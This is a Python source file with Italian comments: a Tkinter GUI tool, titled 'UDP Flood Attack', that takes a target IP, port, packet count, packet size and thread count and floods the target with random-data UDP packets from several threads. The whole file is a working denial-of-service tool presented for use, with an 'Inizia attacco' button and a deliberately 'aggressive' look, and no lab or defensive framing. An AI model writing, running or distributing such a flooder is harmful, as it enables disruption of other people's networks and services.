import socket
import random
import ipaddress
import tkinter as tk
from tkinter import messagebox
import threading
import os

# Funzione per inviare pacchetti UDP in un thread separato
def send_packets(target_ip, target_port, num_packets, packet_size):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        packet = os.urandom(packet_size)  # Usa os.urandom per generare dati casuali
        for _ in range(num_packets):
            sock.sendto(packet, (target_ip, target_port))
            log_text.insert(tk.END, f"Pacchetto inviato (Dimensione: {packet_size} byte)\n")
            log_text.yview(tk.END)
        sock.close()
    except Exception as e:
        log_text.insert(tk.END, f"Errore nel thread: {e}\n")
        log_text.yview(tk.END)

# Funzione per avviare l'attacco
def start_attack():
    target_ip = entry_ip.get()
    target_port = entry_port.get()
    num_packets = entry_packets.get()
    packet_size = entry_size.get()
    num_threads = entry_threads.get()

    # Validazione dell'IP, della porta, del numero di pacchetti, della dimensione pacchetti e dei thread
    if not validate_input(target_ip, target_port, num_packets, packet_size, num_threads):
        return

    # Avvio dell'attacco con threading
    log_text.insert(tk.END, f"Inizio attacco su {target_ip}:{target_port}\n")
    log_text.yview(tk.END)

    num_packets = int(num_packets)
    packet_size = int(packet_size)
    num_threads = int(num_threads)

    for _ in range(num_threads):
        threading.Thread(target=send_packets, args=(target_ip, int(target_port), num_packets // num_threads, packet_size), daemon=True).start()

# Funzione per validare l'input
def validate_input(target_ip, target_port, num_packets, packet_size, num_threads):
    try:
        ipaddress.ip_address(target_ip)  # Validazione IP
    except ValueError:
        messagebox.showerror("Errore", "Indirizzo IP non valido.")
        return False

    if not target_port.isdigit() or not (1 <= int(target_port) <= 65535):
        messagebox.showerror("Errore", "La porta deve essere un numero intero tra 1 e 65535.")
        return False

    if not num_packets.isdigit() or int(num_packets) <= 0:
        messagebox.showerror("Errore", "Il numero di pacchetti deve essere un intero positivo.")
        return False

    if not packet_size.isdigit() or int(packet_size) <= 0:
        messagebox.showerror("Errore", "La dimensione dei pacchetti deve essere un intero positivo.")
        return False

    if not num_threads.isdigit() or int(num_threads) <= 0:
        messagebox.showerror("Errore", "Il numero di thread deve essere un intero positivo.")
        return False

    return True

# GUI
root = tk.Tk()
root.title("UDP Flood Attack")
root.geometry("600x500")
root.config(bg="black")  # Sfondo scuro per un aspetto più aggressivo

# Variabili Entry per l'input
entry_ip = tk.Entry(root, width=30, font=("Arial", 12))
entry_port = tk.Entry(root, width=30, font=("Arial", 12))
entry_packets = tk.Entry(root, width=30, font=("Arial", 12))
entry_size = tk.Entry(root, width=30, font=("Arial", 12))
entry_threads = tk.Entry(root, width=30, font=("Arial", 12))

# Label e input
labels = [
    ("Indirizzo IP della macchina target:", entry_ip),
    ("Numero di porta UDP:", entry_port),
    ("Numero di pacchetti da inviare:", entry_packets),
    ("Dimensione dei pacchetti (in byte):", entry_size),
    ("Numero di thread:", entry_threads)
]

for text, var in labels:
    label = tk.Label(root, text=text, bg="black", fg="red", font=("Arial Black", 12))  # Rosso per l'aggressività
    label.pack(pady=5)
    var.pack(pady=5)

# Pulsante per avviare l'attacco
start_button = tk.Button(root, text="Inizia attacco", command=start_attack, bg="red", fg="white", font=("Arial Black", 12))
start_button.pack(pady=10)

# Area di log
log_text = tk.Text(root, width=70, height=15, wrap=tk.WORD, font=("Arial", 10), bg="black", fg="white")
log_text.pack(pady=10)
log_text.insert(tk.END, "Benvenuto! Inserisci i parametri e clicca 'Inizia attacco' per avviare l'attacco UDP.\n")

# Esegui la GUI
root.mainloop()
